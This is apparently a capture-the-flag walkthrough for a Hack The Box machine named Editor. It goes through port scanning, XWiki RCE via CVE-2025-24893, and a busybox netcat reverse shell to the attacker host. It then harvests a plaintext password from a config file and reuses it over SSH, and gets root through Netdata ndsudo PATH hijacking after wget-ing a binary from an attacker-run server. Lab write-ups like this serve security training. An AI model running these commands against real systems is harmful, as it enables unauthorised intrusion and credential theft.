Target: 
  10.10.11.80 -- (yours will be different)
  editor.htb

--Setup Target In Hosts
	echo -e "10.10.11.80\teditor.htb" | sudo tee -a /etc/hosts > /dev/null

--Nmap
	Starting with a port scan followed up with a versions/scripts scan
	  	nmap -sS -p- --min-rate=1000 -oN Recon/ports.nmap editor.htb
	  	nmap -sSVC -p 22,80,8080 -oN Recon/versions.nmap editor.htb
		
		I got ssh for ubuntu(22), nginx(80), and jetty(8080)
	
--HTTP exploration/exploitation
	Looking around, I found a wiki subdomain, you have to add it to hosts with
	  echo -e "10.10.11.80\twiki.editor.htb" | sudo tee -a /etc/hosts > /dev/null
	
	The wiki uses Xwiki, which has an RCE vulnerability for this version (15.10.8), CVE-2025-24893 
	I downloaded the PoC from https://github.com/CMassa/CVE-2025-24893/blob/main/CVE-2025-24893.py and confirmed it was vulnerable with
  		python3 CVE-2025-24893.py -t http://editor.htb:8080 --verify
	
	With the PoC, I made a reverse shell
  		python3 CVE-2025-24893.py -t http://editor.htb:8080 --command "busybox nc [your host ip] 1111 -e /bin/bash"
	
	I recommend making it a smart shell
	    script /dev/null -c bash
	    [ctrl+z]
	    stty raw -echo;fg
	    [enter]

--Initial to User access
	After researching and manually searching config files, I found a password in a config file -- theEd1t0rTeam99
	  	cat webapps/xwiki/WEB-INF/hibernate.cfg.xml | grep "password"
	
	using cat /etc/passwd we can see there are 2 users, oliver, _laurel
	The password ended up working for oliver
		ssh oliver@editor.htb
		theEd1t0rTeam99
	
--User to Root Access
	Read the flag
		cat user.txt

	Ignore the sh script that claims to gives root, it doesn't work
	If you run id you can see you are part of a Netdata group
	researching netdata vulns CVE-2024-32019 comes up, and a very detailed exploit POC comes up as well
  	https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation
	
	You have to manually compile the script on your host since there is no GCC on the target
		gcc poc.c -o nvme
	Then host it with a Python HTTP server 
	    python3 -m http.server 80
	And download the file to the target in the /tmp directory 
	    cd /tmp/fakebin
	    wget http://(your host ip):80/nvme
	Following the PoC instructions to get root
	    chmod +x /tmp/fakebin/nvme
	    export PATH=/tmp/fakebin:$PATH
	    /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

-Root
	Read the flag
		cat root.txt
